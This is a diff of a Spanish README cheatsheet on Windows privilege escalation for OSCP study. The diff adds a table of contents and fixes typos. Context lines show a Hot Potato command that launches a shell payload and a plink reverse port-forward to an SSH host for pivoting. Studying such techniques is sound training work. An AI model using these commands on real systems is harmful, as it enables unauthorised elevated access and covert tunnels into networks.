@@ -1,6 +1,23 @@
 # Windows-Priv-Esc
 Una cheatsheet con los conceptos para poder escalar privilegios en Windows.
 
+## Índice
+
+- [Windows-Priv-Esc](#windows-priv-esc)
+     * [Service Exploits](#services-exploits)
+     * [Kernel Exploits](#kernel-exploits)
+     * [Password](#password)
+     * [Scheduled Tasks](#scheduled-tasks)
+     * [Insecures GUI Apps](#insecures-gui-apps)
+     * [Startup Apps](#startup-apps)
+     * [Apps Exploits](#apps-exploits)
+     * [Hot Potatos](#hot-potato)
+     * [Juicy Potatos](#juicy-potatos)
+     * [Port Forwarding](#port-forwarding)
+
+# Windows-Priv-Esc
+Una cheatsheet con los conceptos para poder escalar privilegios en Windows.
+
 # Windows Priv Esc
 - Notas realizadas para la preparación de OSCP
 
@@ -256,11 +273,11 @@ potato.exe -ip x.x.x.x -cmd "C:\PrivEsc\shell.exe" -enable_http server true -ena
 
 ```
 
-## Port Forwading
+## Port Forwarding
 
 -  Pivotear a servicios que no tengamos accesos desde la red externa 
 
-- Editar el arvhico en tu linux de /etc/ssh/sshd_config 
+- Editar el archivo en tu linux de /etc/ssh/sshd_config 
 
 ```
 > plink.exe root@10.10.10.x -R [LPORT]:127.0.0.1:[RPORT]
